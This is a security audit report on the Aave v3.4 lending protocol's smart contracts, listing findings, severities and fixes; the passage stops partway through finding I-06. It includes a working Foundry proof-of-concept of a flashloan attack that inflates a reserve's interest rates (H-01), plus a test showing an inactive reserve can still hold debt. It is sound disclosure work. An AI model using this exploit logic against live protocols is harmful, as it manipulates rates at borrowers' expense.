<table>
    <tr><th></th><th></th></tr>
    <tr>
        <td><img src="https://raw.githubusercontent.com/aave-dao/aave-brand-kit/refs/heads/main/Logo/Logomark-purple.svg" width="250" height="250" style="padding: 4px;" /></td>
        <td>
            <h1>Aave v3.4 Report</h1>
            <p>Prepared for: Aave DAO</p>
            <p>Code produced by: BGD Labs</p>
            <p>Report prepared by: Emanuele Ricci (StErMi), Independent Security Researcher</p>
        </td>
    </tr>
</table>

# Introduction

A time-boxed security review of the **Aave v3.4** protocol was done by **StErMi**, with a focus on the security aspects of the application's smart contracts implementation.

# Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where I try to find as many vulnerabilities as possible. I can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

# About **Aave v3.4**

Aave v3.4 is an upgrade to the Aave v3 protocol, currently running on v3.3 in production across all networks.
It includes the following changes and improvements:

- Migration of the custom GHO logic and a/v tokens to a model the same as any other asset, to simplify overall the codebase and its reasoning.
- Addition of Multicall support on the Pool contract.
- Introduction of a Position Manager role for users to assign to other addresses, allowing them to do a subset of actions on their behalf: switching Liquid modes, and enabling/disabling an asset as collateral.
- Removal of the unused BridgeLogic and the concept of “unbacked” in the protocol, never used either.
- Make different variables immutables, to align with the high-level nature of never-to-be-changed.
- Refactor the Error logic to use Error signatures instead of error codes.
- In addition to the migration of GHO from custom to standard, unification of aTokens’ storage and implementation for all assets (aAAVE was different from others due to its role in governance voting).
- Upgrade the compilation version to 0.8.27 to improve overall compatibility with tooling and dependencies.
- Multiple minor misc improvements and optimizations.

An exhaustive explanation of all changes included can be found on [Aave-v3.4-features.md](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/docs/3.4/Aave-v3.4-features.md)

References:

- [BGD. Aave v3.4](https://governance.aave.com/t/arfc-bgd-aave-v3-4/21572)
-

# About **StErMi**

**StErMi**, is an independent smart contract security researcher. He serves as a Lead Security Researcher at Spearbit and has identified multiple bugs in the wild on Immunefi and on protocol's bounty programs like the Aave Bug Bounty.

Do you want to connect with him?

- [stermi.xyz website](https://stermi.xyz/)
- [@StErMi on Twitter](https://twitter.com/StErMi)

# Summary & Scope

**_review commit hash_ - [`468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015`](https://github.com/aave-dao/aave-v3-origin/tree/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015)**

# Severity classification

| Severity               | Impact: High | Impact: Medium | Impact: Low |
| ---------------------- | ------------ | -------------- | ----------- |
| **Likelihood: High**   | Critical     | High           | Medium      |
| **Likelihood: Medium** | High         | Medium         | Low         |
| **Likelihood: Low**    | Medium       | Low            | Low         |

**Impact** - the technical, economic and reputation damage of a successful attack
**Likelihood** - the chance that a particular vulnerability gets discovered and exploited
**Severity** - the overall criticality of the risk

---

# Findings Summary

| ID     | Title                                                                                                                                           | Severity | Status    |
| ------ | ----------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| [H-01] | The flashloan logic allow an attacker to inflate the usage ratio and boost the interest paid by borrowers and earned by suppliers               | High     | Fixed     |
| [L-01] | Liquidation wrongly skip burning and accounting bad debt into `deficit` when a reserve has debt but is not active                               | Low      | Fixed     |
| [L-02] | `_burnDebtTokens` should initialize `noMoreDebt` to `true`                                                                                      | Low      | Fixed     |
| [I-01] | Considerations on the `REWARDS_CONTROLLER` value of the `IncentivizedERC20` contract                                                            | Info     | Ack       |
| [I-02] | `VariableDebtToken` and `VariableDebtTokenMainnetInstanceGHO` storage layout should be aligned                                                  | Info     | Ack       |
| [I-03] | Position manager functions should trigger ad-hoc events                                                                                         | Info     | Ack       |
| [I-04] | Missing sanity checks                                                                                                                           | Info     | Fixed     |
| [I-05] | The user should not be allowed to set himself as a position manager and execute position-manager-related functions                              | Info     | Fixed     |
| [I-06] | `setUserUseReserveAsCollateral` should not prevent the user to turn off the "use-as-collateral" flag when the balance is zero                   | Info     | Fixed     |
| [I-07] | The logic to toggle "use-as-collateral" and "is-borrowing" flags should be unified across all the codebase and based on the user scaled balance | Info     | Ack       |
| [I-08] | Consider adding inputs to the new defined custom errors                                                                                         | Info     | Ack       |
| [I-09] | Bulk informational changes/refactor/suggestions                                                                                                 | Info     | Fixed+Ack |
| [I-10] | `BalanceTransfer` event should be moved back to the `IAToken` interface                                                                         | Info     | Fixed     |
| [I-11] | Consider triggering `ReserveInterestRateStrategyChanged` when `PoolInstance.initialize` is executed                                             | Info     | Ack       |
| [I-12] | `PoolInstance` should verify that the new `RESERVE_INTEREST_RATE_STRATEGY` is configured for the existing reserves                              | Info     | Ack       |
| [I-13] | `AaveProtocolDataProvider` is assuming that the immutable `POOL` address cannot change in `PoolAddressesProvider`                               | Info     | Fixed     |
| [I-14] | Typos or missing documentation in natspec                                                                                                       | Info     | Fixed     |

# [H-01] The flashloan logic allow an attacker to inflate the usage ratio and boost the interest paid by borrowers and earned by suppliers

## Context

- [FlashLoanLogic.sol#L211-L243](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/FlashLoanLogic.sol#L211-L243)

## Description

With the v3.4 release, the flashloan logic has received multiple changes:

- the whole premium paid by the flashloaner goes toward the protocol in full
- the whole premium is not "converted" as `AToken` shares but transferred to the `TREASURY` directly as `underlying`

The implementation of those changes and the new way to handle the repayment of the flashloan (when it does not open a borrow position) have introduced a bug that allows anyone (willing to pay the premium) to set up to 100% the reserve usage ratio and so increase the interest paid by borrowers and earned by suppliers.

Let's take the "simple flashloan" operation as an example to explain the issue (the complex one has the same problem):

1. `executeFlashLoanSimple` reduce the `reserve.virtualUnderlyingBalance` by the `amount` requested by the user
2. the `amount` of `underlying` is transferred from the `AToken` reserve to the `receiver` contract
3. the `receiver.executeOperation(...)` callback is executed
4. the `receiver` contract performs any operations needed and prepares to "return back" `amount + premium` of `underlying`
5. the `_handleFlashLoanRepayment` function is executed
6. the `reserve.virtualUnderlyingBalance` is increased back by amount
7. `amount + premium` of `underlying` is "pulled" from the `receiver` contract
8. `amount` of `underlying` is sent to the `AToken` reserve
9. `premium` of `underlying` is sent to the `treasury`

The problem with the above logic is that the `FlashLoanLogic` is not taking in consideration that during the "Step 4" the `receiver` contract can perform **any** operation on the AAVE Pool while the `reserve.virtualUnderlyingBalance` has been decreased by amount and the reserve state (indexes, treasury shares and rates) won't be "refreshed" again via `reserve.updateState(...)` and `reserve.updateInterestRatesAndVirtualBalance(...)` in `_handleFlashLoanRepayment`

Let's make an example. Let's assume that the Pool has `200_000 USDC` supplied to the reserve and `100_000 USDC` has been already borrowed. `reserve.virtualUnderlyingBalance` will be equal to `100_000 USDC`.

The attacker performs a flashloan of `100_000 USDC` bringing the `virtualUnderlyingBalance` to `0` (zero) and in the `receiver` callback performs a combo of `supply+withdraw` of `1 wei` of `USDC` to trigger the update of the reserve indexes and rates.

When the rates are updated by the `withdraw` operation the `virtualUnderlyingBalance` will be equal to `0` and so the usage ratio of the reserve will be equal to `100%`. This will boost both the supply and borrow rates that **will not** be updated back when the `_handleFlashLoanRepayment` is executed to finish the flashloan flow.

Those boosted rates will remain inflated until someone else perform an operation that involve the update of the reserve state (indexes) and rates. This will result in the temporary increase (until the "refresh") of both the interest paid by the borrower and paid to (in the future) to the suppliers (and the amount of shares accounted to the treasury as protocol fees).

The attack can be repeated as at infinite as long as the attacker is willing to pay the small fee identified by the flashloan premium.

### PoC

This PoC can be executed on both the v3.4 and v3.4 release of AAVE to see the different behavior and compare the values of the indexes, rates and supply/debt balance.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import { IERC20 } from "../../../src/contracts/dependencies/openzeppelin/contracts/IERC20.sol";
import { ReserveConfiguration } from "../../../src/contracts/protocol/pool/PoolConfigurator.sol";
import { WadRayMath } from "../../../src/contracts/protocol/libraries/math/WadRayMath.sol";
import { PercentageMath } from "../../../src/contracts/protocol/libraries/math/PercentageMath.sol";
import { IPoolAddressesProvider } from "../../../src/contracts/interfaces/IPoolAddressesProvider.sol";
import { DataTypes } from "../../../src/contracts/protocol/libraries/types/DataTypes.sol";
import { TestnetProcedures } from "../../utils/TestnetProcedures.sol";
import { FlashLoanSimpleReceiverBase } from "../../../src/contracts/misc/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import { IDefaultInterestRateStrategyV2 } from "../../../src/contracts/interfaces/IDefaultInterestRateStrategyV2.sol";

contract FlashloanReceiver is FlashLoanSimpleReceiverBase {
  constructor(
    IPoolAddressesProvider provider
  ) FlashLoanSimpleReceiverBase(provider) {}

  function executeOperation(
    address asset,
    uint256 amount,
    uint256 premium,
    address, // initiator
    bytes memory // params
  ) public override returns (bool) {
    // supply and withdraw 1 wei to just trigger the reserve update of the index and rates
    // this will bring the usage ratio to 100% because we have flashloaned everything
    POOL.supply(asset, 1, address(this), 0);
    POOL.withdraw(asset, 1, address(this));

    // vb now is 0
    require(POOL.getVirtualUnderlyingBalance(asset) == 0);
    return true;
  }
}

contract SFlashloanTests is TestnetProcedures {
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using WadRayMath for uint256;
  using PercentageMath for uint256;

  address s1;
  address b1;
  address attacker;
  FlashloanReceiver attackerFLReceiver;

  function setUp() public {
    initTestEnvironment();

    // current IRS config used for USDC on mainnet
    bytes memory USDX_IRS_CONFIG = abi.encode(
      IDefaultInterestRateStrategyV2.InterestRateData({
        optimalUsageRatio: 92_00,
        baseVariableBorrowRate: 0,
        variableRateSlope1: 5_50,
        variableRateSlope2: 35_00
      })
    );
    vm.prank(poolAdmin);
    contracts.poolConfiguratorProxy.setReserveInterestRateData(
      tokenList.usdx,
      USDX_IRS_CONFIG
    );
  }

  function testFlashloanAttackS() public {
    // deploy attack FL receiver
    attackerFLReceiver = new FlashloanReceiver(
      IPoolAddressesProvider(report.poolAddressesProvider)
    );

    // prepare the users
    s1 = makeAddr("s1");
    b1 = makeAddr("b1");
    attacker = makeAddr("attacker");
    _prepareUser(s1, 200_000e6, 100e18);
    _prepareUser(b1, 0, 100e18);

    // 50 USDC is the premium
    _prepareUser(address(attackerFLReceiver), 50e6, 0);

    // prepare the pool with supply/borrow
    // USDX supplied = 200_000e6
    // USDX borrowed = 100_000e6
    // USDX virtual balance = 100_000e6
    vm.prank(s1);
    contracts.poolProxy.supply(tokenList.usdx, 200_000e6, s1, 0);
    vm.startPrank(b1);
    contracts.poolProxy.supply(tokenList.wbtc, 100e18, b1, 0);
    contracts.poolProxy.borrow(tokenList.usdx, 100_000e6, 2, 0, b1);
    vm.stopPrank();

    assertEq(
      contracts.poolProxy.getVirtualUnderlyingBalance(tokenList.usdx),
      100_000e6
    );

    // warp 1 day
    vm.warp(block.timestamp + 1 days);

    // perform the FL attack
    // flashloan 100_000 USDC
    // inside the FL callback virtual underlying balance is ZERO
    // any operation performed (that trigger reserve index and rate updates) will bring the usage ratio to 100%
    // boosting the supply and borrow rate
    // until someone else re-trigger a state update
    // for the delta time between the attack and the "new operation"
    // the borrower will pay more and suppliers earn more than deserved
    bytes memory emptyParams;

    vm.prank(attacker);
    contracts.poolProxy.flashLoanSimple(
      address(attackerFLReceiver),
      tokenList.usdx,
      100_000e6,
      "",
      0
    );

    // warp 1 day to see the effect of the inflated supply and borrow rate
    vm.warp(block.timestamp + 1 days);

    // compare values between v3.3 and v3.4 code
    _printData(tokenList.usdx, s1, b1);
  }

  function _printData(
    address reserve,
    address supplier,
    address borrower
  ) public {
    address vUSDX = contracts.poolProxy.getReserveVariableDebtToken(
      tokenList.usdx
    );
    address aUSDX = contracts.poolProxy.getReserveAToken(tokenList.usdx);
    DataTypes.ReserveDataLegacy memory res = contracts.poolProxy.getReserveData(
      reserve
    );
    console.log(
      "vub        \t:",
      contracts.poolProxy.getVirtualUnderlyingBalance(reserve)
    );
    console.log("l index    \t:", res.liquidityIndex);
    console.log("b index    \t:", res.variableBorrowIndex);
    console.log(
      "l index up \t:",
      contracts.poolProxy.getReserveNormalizedIncome(reserve)
    );
    console.log(
      "b index up \t:",
      contracts.poolProxy.getReserveNormalizedVariableDebt(reserve)
    );
    console.log("l rate     \t:", res.currentLiquidityRate);
    console.log("b rate     \t:", res.currentVariableBorrowRate);
    console.log("u sb       \t:", IERC20(aUSDX).balanceOf(supplier));
    console.log("u bb       \t:", IERC20(vUSDX).balanceOf(borrower));

    console.log("");
  }

  function _prepareUser(
    address user,
    uint256 usdxAmount,
    uint256 wbtcAmount
  ) public {
    vm.startPrank(poolAdmin);
    if (usdxAmount > 0) usdx.mint(user, usdxAmount);
    if (wbtcAmount > 0) wbtc.mint(user, wbtcAmount);
    deal(address(weth), user, 100e18);
    vm.stopPrank();

    vm.startPrank(user);
    usdx.approve(report.poolProxy, UINT256_MAX);
    wbtc.approve(report.poolProxy, UINT256_MAX);
    weth.approve(report.poolProxy, UINT256_MAX);
    vm.stopPrank();
  }
}
```

## Recommendations

A possible solution to be evaluated and verified is to simply update the state and rates of the reserve when the flashloan is repaid

```solidity
function _handleFlashLoanRepayment(
  DataTypes.ReserveData storage reserve,
  DataTypes.FlashLoanRepaymentParams memory params
) internal {
-  reserve.virtualUnderlyingBalance += params.amount.toUint128();

+	 DataTypes.ReserveCache memory reserveCache = reserve.cache();
+	 reserve.updateState(reserveCache);
+  // `virtualUnderlyingBalance` is increased automatically inside `updateInterestRatesAndVirtualBalance`
+  reserve.updateInterestRatesAndVirtualBalance(reserveCache, params.asset, params.amount, 0, params.interestRateStrategyAddress);

  // [...] other code
}
```

**StErMi:** the issue has been addressed in the commit [`c0bd6b9ca3278366f2e8520b47897500ec632a09`](https://github.com/aave-dao/aave-v3-origin/commit/c0bd6b9ca3278366f2e8520b47897500ec632a09)

# [L-01] Liquidation wrongly skip burning and accounting bad debt into `deficit` when a reserve has debt but is not active

## Context

- [LiquidationLogic.sol#L660](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L660)

## Description

The `_burnBadDebt` internal function is executed when the borrower has bad debt (`debt > 0` but `collateral == 0`) and it needs to be burned and accounted for every reserve that the borrower has debt with.

The problem with the current implementation is that if the reserve is not active, the `while` iteration is skipped but the index `i` used to select the `reserveAddress` is not increased.

On the next iteration (after the `continue`) the position of `cachedBorrowerConfig` will be ahead while `i` will still be pointing to the previous value (not increased).

Let's make an example: user has the following config

- supply and borrow from `reserveId 0`
- borrow from `reserveId 1`
- borrow from `reserveId 2`

`reserveId 1` is **non-active** (to set a reserve as non-active you just need to have no suppliers, there's no requirement relative to the borrow amount)

Let's assume that the liquidator has liquidated the `reserveId == 0` and has seized the whole collateral and `_burnBadDebt` is executed

1. Iteration 0 has `cachedBorrowerConfig` pointing to `reserveId = 0` and `i == 0`. This iteration is a no-op because `isBorrowed == false` given that the liquidator has already liquidated all the debt from the "main liquidation flow". By the end of the flow, `cachedBorrowerConfig` points to the `reserveId = 1` and `i++` has been executed.
2. Iteration 1 has `cachedBorrowerConfig` pointing to `reserveId = 1` and `i == 1`. This iteration is **skipped** because `reserveCache.reserveConfiguration.getActive() == 0`. This means that `i++` is **not executed**, but `cachedBorrowerConfig` is pointing to `reserveId = 2`.
3. Iteration 1 has `cachedBorrowerConfig` pointing to `reserveId = 2` **BUT** `i` is still equal to `1` instead of `2`. The iteration will be **skipped** again because `reserveCache` is pointing to the **non-active** reserve. The **bad debt** of the `reserveId = 2` is **not burned** and **not accounted** into the deficit (+ all the other side effects of the case)

This is just an example, we can create multiple scenarios with multiple unwanted behaviors.

### PoC: reserve can be `active = false` and have non-empty debt

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

import { ReserveConfiguration } from "../../../src/contracts/protocol/pool/PoolConfigurator.sol";
import { WadRayMath } from "../../../src/contracts/protocol/libraries/math/WadRayMath.sol";
import { PercentageMath } from "../../../src/contracts/protocol/libraries/math/PercentageMath.sol";
import { DataTypes } from "../../../src/contracts/protocol/libraries/types/DataTypes.sol";
import { IERC20 } from "../../../src/contracts/dependencies/openzeppelin/contracts/IERC20.sol";
import { IAToken, IERC20 } from "../../../src/contracts/interfaces/IAToken.sol";
import { TestnetProcedures } from "../../utils/TestnetProcedures.sol";

contract SInactiveTests is TestnetProcedures {
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using WadRayMath for uint256;
  using PercentageMath for uint256;

  address s1;
  address b1;

  function setUp() public {
    initTestEnvironment();
  }

  function testInactiveWithDebt() public {
    address aUSDX = contracts.poolProxy.getReserveAToken(tokenList.usdx);

    s1 = makeAddr("s1");
    b1 = makeAddr("b1");

    _prepareUser(s1, 10_000e6, 100e18);
    _prepareUser(b1, 10_000e6, 100e18);

    // s1 supply 1k USDC
    vm.prank(s1);
    contracts.poolProxy.supply(tokenList.usdx, 1_000e6, s1, 0);

    // b1 supply wBTC and borrow 1k USDC
    vm.startPrank(b1);
    contracts.poolProxy.supply(tokenList.wbtc, 100e18, b1, 0);
    contracts.poolProxy.borrow(tokenList.usdx, 1_000e6, 2, 0, b1);
    vm.stopPrank();

    // warp 100 days
    vm.warp(block.timestamp + 100 days);

    // this refresh also the shares for treasury
    handleSupplier();
    handleTreasury();

    // de-active USDC (should revert)
    vm.prank(poolAdmin);
    contracts.poolConfiguratorProxy.setReserveActive(tokenList.usdx, false);

    // there is still debt
    // but the reserve has been set to non-active
    address vUSDX = contracts.poolProxy.getReserveVariableDebtToken(
      tokenList.usdx
    );
    assertGt(IAToken(vUSDX).balanceOf(b1), 0);
  }

  function handleTreasury() internal {
    address fakeTreasury = makeAddr("fakeTreasury");
    address aUSDX = contracts.poolProxy.getReserveAToken(tokenList.usdx);
    address treasury = IAToken(aUSDX).RESERVE_TREASURY_ADDRESS();

    // mint shares to treasury
    address[] memory assets = new address[](1);
    assets[0] = tokenList.usdx;
    contracts.poolProxy.mintToTreasury(assets);

    uint256 tb = IAToken(aUSDX).balanceOf(treasury);
    if (tb > 0) {
      vm.prank(b1);
      contracts.poolProxy.repay(tokenList.usdx, tb, 2, b1);

      vm.prank(treasury);
      contracts.poolProxy.withdraw(
        tokenList.usdx,
        type(uint256).max,
        fakeTreasury
      );
    }

    assertEq(IAToken(aUSDX).balanceOf(treasury), 0);
  }

  function handleSupplier() internal {
    address aUSDX = contracts.poolProxy.getReserveAToken(tokenList.usdx);
    uint256 s1b = IAToken(aUSDX).balanceOf(s1);
    vm.prank(b1);
    contracts.poolProxy.repay(tokenList.usdx, s1b, 2, b1);
    vm.prank(s1);
    contracts.poolProxy.withdraw(tokenList.usdx, type(uint256).max, s1);
    assertEq(IAToken(aUSDX).balanceOf(s1), 0);
  }

  function _prepareUser(
    address user,
    uint256 usdxAmount,
    uint256 wbtcAmount
  ) public {
    vm.startPrank(poolAdmin);
    if (usdxAmount > 0) usdx.mint(user, usdxAmount);
    if (wbtcAmount > 0) wbtc.mint(user, wbtcAmount);
    deal(address(weth), user, 100e18);
    vm.stopPrank();

    vm.startPrank(user);
    usdx.approve(report.poolProxy, UINT256_MAX);
    wbtc.approve(report.poolProxy, UINT256_MAX);
    weth.approve(report.poolProxy, UINT256_MAX);
    vm.stopPrank();
  }
}
```

## Recommendations

BGD must increase the `i` index inside the `if (!reserveCache.reserveConfiguration.getActive())` conditional branch.

**StErMi:** the recommendations have been implemented in the commit [`0f62f400899f94c7ac8c3504ed766808a147ff25`](https://github.com/aave-dao/aave-v3-origin/commit/0f62f400899f94c7ac8c3504ed766808a147ff25)

# [L-02] `_burnDebtTokens` should initialize `noMoreDebt` to `true`

## Context

- [LiquidationLogic.sol#L518](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L518)

## Description

When `_burnDebtTokens` is called from the "main liquidation flow" we know for sure that `borrowerReserveDebt > 0` because otherwise it would have already reverted by `ValidationLogic.validateLiquidationCall`.

The other function that calls `_burnDebtTokens` is `_burnBadDebt` that is called to burn the bad debt (if we're in such a scenario). Over there, `_burnDebtTokens` is called only when `userConfig.isBorrowing(i) == true` this means that the flag is `true` and the protocol thinks that the user is borrowing such a token.

When `_burnDebtTokens` is executed and `borrowerReserveDebt == 0` it means that the borrowing flag for the `(borrower, asset)` tuple was wrongly configured from a previous protocol interaction (see the comment "Prior v3.1, there were cases where, after liquidation, the `isBorrowing` flag was left on [...]")

In that case, `noMoreDebt` is not initialized by the result of `.burn` and will remain `false` and `borrowerConfig.setBorrowing` is not called avoiding restoring the "correct" value for the is-borrowing flag for the `(user, asset)` config.

In the previous logic instead, with the same scenario (`isBorrowing == true` but `debt == 0`) we would have

`uint256 outstandingDebt = userReserveDebt - actualDebtToLiquidate == 0` because `userReserveDebt = 0` (our scenario) and `actualDebtToLiquidate == 0` (because we are from the `_burnBadDebt` function flow). And the below flow would have always been executed

```solidity
if (outstandingDebt == 0) {
      userConfig.setBorrowing(debtReserve.id, false);
}
```

## Recommendations

BGD should initialize `bool noMoreDebt;` to `true`

**StErMi:** the recommendations have been implemented in the commit [`4024e0f1834821a0c089ba6c18b2e12884830e92`](https://github.com/aave-dao/aave-v3-origin/commit/4024e0f1834821a0c089ba6c18b2e12884830e92)

# [I-01] Considerations on the `REWARDS_CONTROLLER` value of the `IncentivizedERC20` contract

## Context

- [IncentivizedERC20.sol#L92](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/base/IncentivizedERC20.sol#L92)

## Description

The current implementation of the `IncentivizedERC20` (inherited by both the `AToken` and `VariableDebtToken`) does not make any active assumptions and sanity checks about the values that the `REWARDS_CONTROLLER` immutable state variable can be initialized with.

BGD should consider defining an invariant for such a variable to optimize the code and logic of the contract.

If the `REWARDS_CONTROLLER` can be `address(0)` nothing needs to be changed
If the `REWARDS_CONTROLLER` cannot be `address(0)` they should:

1. revert to the `constructor` if `rewardsController` is `address(0)`
2. remove all the checks `if (address(REWARDS_CONTROLLER) != address(0)) {` that are implemented before calling `REWARDS_CONTROLLER.handleAction`

## Recommendations

BGD should define what values the `REWARDS_CONTROLLER` can assume and modify (if needed) the implementation of the codebase accordingly

**BGD:** ack, won't change

# [I-02] `VariableDebtToken` and `VariableDebtTokenMainnetInstanceGHO` storage layout should be aligned

## Context

- [VariableDebtToken.sol](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/VariableDebtToken.sol)
- [VariableDebtTokenMainnetInstanceGHO.sol#L17-L30](https://github.com/bgd-labs/protocol-v3.4-upgrade/blob/186d51e653fcc02a43d55dd361d7efa5941053c1/src/VariableDebtTokenMainnetInstanceGHO.sol#L17-L30)

## Description

The v3.4 upgrade deployments will be responsible to also align the `vGHO` (`GHO` variable debt token) contract to the "standard" `VariableDebtToken` contract.

To accomplish that, both the contracts need to be also aligned at the storage structure and storage slot values. The current implementation (live on mainnet) of `vGHO` has some custom storage slots used for internal accounting that will be deprecated and cleaned by the upgrade process.

```solidity
  // These are additional variables that were in the v3.3 VToken for the GHO aToken
  // but there is no such variables in all other vTokens in both v3.3 and v3.4
  // so we need to clean them in case in future versions of vTokens it will be
  // needed to add new storage variables.
  // If we don't clean them, then the aToken for the GHO token will have non zero values
  // in these new variables that may be added in the future.
  address private _deprecated_ghoAToken;
  address private _deprecated_discountToken;
  address private _deprecated_discountRateStrategy;

  // This global variable can't be cleaned. The future vToken code upgrades should consider
  // that on this slot there can't be a new mapping because it holds some non-zero values
  // On this slot there can be only value types, not reference types.
  // mapping(address => GhoUserState) internal _deprecated_ghoUserState;
```

The current upgrade logic will:

- rename those variables with the `_deprecated_` suffix
- clean the value at deployment time
- comment the `_deprecated_ghoUserState` variable

The suggestion in this case is to go another step further to fully embrace the alignment of all the A/V tokens to use the same codebase, even if at the beginning it will be less "clean".

The first three will be cleaned during the deployment of the new `vGHO` contract, so they are free and safe to use also by new deployment of "normal" `vToken`.

But `_deprecated_ghoUserState` (that has been commented out currently) could be problematic. While it's true that the storage slot value of a `mapping` is indeed `0`, if a future version of `VariableDebtToken` is going to use it as another `mapping (address => something)` (and `vGHO` is upgraded to it), it could end up using the same storage position for the same `K` and so the `V` value could be already **dirty** with all the unexpected consequences and problems.

To solve this issue, BGD should:

- add a "stub" dummy storage value to the `VariableDebtToken`. These variables can be freely used in the future by both any standard `VariableDebtToken` and `vGHO`
- add a **NON** comment `__deprecatedSlot` to both the `VariableDebtToken` and `VariableDebtTokenMainnetInstanceGHO` that should replace the old `mapping(address => GhoUserState) internal _deprecated_ghoUserState` variable used by `vGHO`. This storage slot must be **skipped** by any future version of `VariableDebtToken` and `vGHO` to be on the safe side.

## Recommendations

BGD should carefully implement the above suggestions to fully align the implementation and deployment of the current and future release of both `vGHO` and `VariableDebtToken`

**BGD:** ack. We'll consider it for the next upgrade. For 3.4 it feels cleaner to separate them.

# [I-03] Position manager functions should trigger ad-hoc events

## Context

- [Pool.sol#L822-L839](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L822-L839)
- [Pool.sol#L841-L856](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L841-L856)

## Description

Both the `setUserUseReserveAsCollateralOnBehalfOf` and `setUserEModeOnBehalfOf` functions will trigger the underlying existing logic without tracking the address of the position manager address that changed the user state.

## Recommendations

BGD should consider tracking the address of the position manager who has changed the user state. This can be done by passing down the position manager address to the `SupplyLogic.executeUseReserveAsCollateral` and `EModeLogic.executeSetUserEMode` logic, or by triggering a more "generic" event at the root level that needs to be evaluated with the more specific one that will not include the position manager information.

**BGD:** ack, won't fix.

The protocol already does not always emit the address responsible for a change.
Therefore, adding the event here adds some noise while not improving the overall situation.

# [I-04] Missing sanity checks

## Description

- [x] [Pool.sol#L99-L106](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L99-L106): `Pool.constructor` should revert if `provider` or `interestRateStrategy` are `address(0)`
- [x] [AToken.sol#L47](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/tokenization/AToken.sol#L47): `AToken.constructor` should revert when `treasury` is `address(0)`

## Recommendations

BGD should consider implementing the above suggested basic sanity checks

**StErMi:** the recommendations have been implemented in the commit [`6700bd912b8c350ea8f477af8a3dedb2b9f55691`](https://github.com/aave-dao/aave-v3-origin/commit/6700bd912b8c350ea8f477af8a3dedb2b9f55691) and [`57e7d73e15a4e389d1c8f3dd1f93be0d318b317c`](https://github.com/aave-dao/aave-v3-origin/commit/57e7d73e15a4e389d1c8f3dd1f93be0d318b317c)

# [I-05] The user should not be allowed to set himself as a position manager and execute position-manager-related functions

## Context

- [Pool.sol#L94](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L94)
- [Pool.sol#L804-L813](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/pool/Pool.sol#L804-L813)

## Description

The `_onlyPositionManager` internal function is called by the `onlyPositionManager` modifier that is called only by the `setUserUseReserveAsCollateralOnBehalfOf` and `setUserEModeOnBehalfOf` function that should be used **only** by the Position Managers approved by the `onBehalfOf` user.

With `onBehalfOf == _msgSender()` those functions are also allowing the user itself (in addition to the approved PM) to execute them.
While it's OK from a security prospective, BGD should remove that condition and allow **only** the PM to call the `*OnBehalfOf` version of the function and "force" the user to use the "normal" version of those functions.

The current behavior just creates confusions and a bad practice (like allowing calling `transferFrom(msg.sender, receiver, amount)`) without a real benefit.

The same logic should also be applied to the `approvePositionManager` and revert when `_msgSender()` (the approving user) is whitelisting itself as a position manager. The position manager should be a differ user that is **not** the user itself.

## Recommendations

BGD should apply the following changes:

```diff
function _onlyPositionManager(address onBehalfOf) internal view virtual {
  require(
-  onBehalfOf == _msgSender() || _positionManager[onBehalfOf][_msgSender()],
+  _positionManager[onBehalfOf][_msgSender()],
    Errors.CallerNotPositionManager()
  );
}
```

```diff
function approvePositionManager(address positionManager, bool approve) external override {
+	require(_msgSender() != positionManager, Errors.CUSTOM_ERROR_TO_BE_DEFINED())

  // [...] existing code
}
```

**StErMi:** the commit [`22fa8067c68220c5f22c656849d761685711db13`](https://github.com/aave-dao/aave-v3-origin/commit/22fa8067c68220c5f22c656849d761685711db13) implements the recommendations relative to the `_onlyPositionManager` changes. BGD has decided to acknowledge the second recommendations without implementing the changes suggested for the `approvePositionManager` function, as it's more in line with other popular ecosystem contracts (e.g. `transferFrom`/ `allowance` in `ERC20`)

# [I-06] `setUserUseReserveAsCollateral` should not prevent the user to turn off the "use-as-collateral" flag when the balance is zero

## Context

- [ValidationLogic.sol#L304](https://github.com/aave-dao/aave-v3-origin/blob/468e5dc4e5c3fbb40ef3dafdf76d7cb4f4e0f015/src/contracts/protocol/libraries/logic/ValidationLogic.sol#L304)

## Description

The current logic of `ValidationLogic.validateSetUseReserveAsCollateral` reverts when the user (or the position manager) tries to execute `Pool.setUserUseReserveAsCollateral(asset, false)` (or the PM version) and the user has no balance of such token.

